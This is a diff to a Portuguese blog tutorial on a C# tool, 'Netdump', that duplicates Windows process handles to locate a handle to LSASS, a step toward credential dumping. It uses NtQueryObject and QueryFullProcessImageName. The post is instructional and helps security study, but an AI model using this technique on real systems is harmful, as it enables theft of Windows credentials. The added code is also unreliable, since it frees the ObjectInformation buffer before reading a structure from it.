@@ -285,14 +285,14 @@ Netdump.Invokes.CloseHandle(hDuplicate);
 Netdump.Invokes.CloseHandle(hObject);
 ```
 
-Para duplicar o handle, é necessário um privilégio essencial: `PROCESS_DUP_HANDLE⁹`. Feito isso, após a abertura de um novo handle ao processo alvo (o que foi destacado no Process Hacker), é realizada a chamada da API. Ela terá como resultado um novo handle, referenciado como `hDuplicate`, que será o duplicado. Mas, não se enganem, não é tão fácil assim. :P
+Para duplicar o handle, é necessário um privilégio essencial: `PROCESS_DUP_HANDLE⁹`. Feito isso, após a abertura de um novo handle ao processo alvo (o que foi destacado no Process Hacker), é realizada a chamada da API. Ela terá como resultado um novo handle, referenciado como `hDuplicate`, que será o duplicado. Mas, não se enganem, este handle não é necessariamente o do LSASS. :P
 
 > - `PROCESS_DUP_HANDLE⁹`: permissão necessária para duplicar um handle.
 {: .prompt-info }
 
-## NtQueryObject¹⁰
+## NtQueryObject¹¹
 
-> - `NtQueryObject¹⁰`: API utilizada para filtrar informações de um objeto.
+> - `NtQueryObject¹¹`: API utilizada para filtrar informações de um objeto.
 {: .prompt-info }
 
 Chegando aos passos finais, vamos filtrar o tipo de handle que está sendo duplicado. Existem diversas modalidades deles, como handles de: "Process", "Keys", "Files", "Threads", entre outros. O tipo de handle que precisamos é da categoria "Process". Dito isso, uma API que filtra por esse tipo de informação é a `NtQueryObject`.
@@ -317,7 +317,7 @@ public static extern NTSTATUS NtQueryObject(
 );
 ```
 
-Similarmente a API `NtQuerySystemInformation`, também não sabemos o tamanho do resultado que a função retornará. Logo, também será necessário um loop para verificar quando a API retorna `STATUS_INFO_LENGTH_MISMATCH`.
+Similarmente a API `NtQuerySystemInformation`, também não sabemos o tamanho do resultado que a função retornará.
 
 ```csharp
 var objTypeInfo = new Netdump.Tables.OBJECT_TYPE_INFORMATION();
@@ -347,29 +347,60 @@ while (Netdump.Invokes.NtQueryObject(
 A lógica continua a mesma: a cada vez que a API retornar o erro de `STATUS_INFO_LENGTH_MISMATCH`, mais memória será alocada ao `ObjectInformationLength` até completar o valor necessário para cobrir a resposta da API.
 
 ```csharp
+Marshal.FreeHGlobal(ObjectInformation);
+
+// acessando a tabela OBJECT_TYPE_INFORMATION
 objTypeInfo = (Netdump.Tables.OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(ObjectInformation, typeof(Netdump.Tables.OBJECT_TYPE_INFORMATION));
 
 var objTypeInfoBuf = new byte[objTypeInfo.TypeName.Length];
 
 Marshal.Copy(objTypeInfo.TypeName.Buffer, objTypeInfoBuf, 0, objTypeInfo.TypeName.Length);
+// transferindo memórias, o valor de objTypeInfo.TypeName será copiado ao objTypeInfoBuf
 
-var pathExe = Encoding.Unicode.GetString(objTypeInfoBuf);
+string hexValue = "0x" + hDuplicate.ToString("X");
+
+var typeHandle = Encoding.Unicode.GetString(objTypeInfoBuf);
+
+if (typeHandle.Equals("Process", StringComparison.OrdinalIgnoreCase)) // checando se o handle é do tipo "Process"
+{
+	Console.WriteLine($"PID: {Netdump.Invokes.GetProcessId(hDuplicate)}. O handle {hexValue} é do tipo Process.");
+}
+```
+
+No código acima, será acessado o valor `TypeName` de cada handle que está representado no valor `hDuplicate`. Caso o tipo do handle seja de "Process", o PID do processo e o identificador do handle é exibido.
+
+![Desktop View](https://i.imgur.com/kRelr66.png)
+
+## QueryFullProcessImageName¹²
+
+> - `QueryFullProcessImageName¹²`: API utilizada para descobrir o path do executável de um processo.
+{: .prompt-info }
+
+```csharp
+[DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
+public static extern bool QueryFullProcessImageName(
+	[In] IntPtr hProcess, // handle do processo
+	[In] uint dwFlags, // 0 = Win32 path
+	[Out] StringBuilder lpExeName, // saída da api, o path do exe
+	[In, Out] ref uint lpdwSize // tamanho do buffer do lpExeName
+);
+```
+
+```csharp
+var typeHandle = Encoding.Unicode.GetString(objTypeInfoBuf);
 
 int buffer = 1024;
 
 var fileNameBuilder = new StringBuilder(buffer);
 uint bufferLength = (uint)fileNameBuilder.Capacity + 1;
 
-string hexValue = "0x" + hDuplicate.ToString("X");
-
-if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
+if (typeHandle.Equals("Process", StringComparison.OrdinalIgnoreCase))
 {
-	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
-	{
-		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
-		{
-			Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}, Path: {fileNameBuilder.ToString()}");
-		}
-	}
+	var result = Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength);
+	Console.WriteLine(fileNameBuilder.ToString());
 }
 ```
+
+Feito isso, a API retornará o caminho do executável referente ao processo referenciado no `hDuplicate`.
+
+![Desktop View](https://i.imgur.com/XHuRhfT.png)
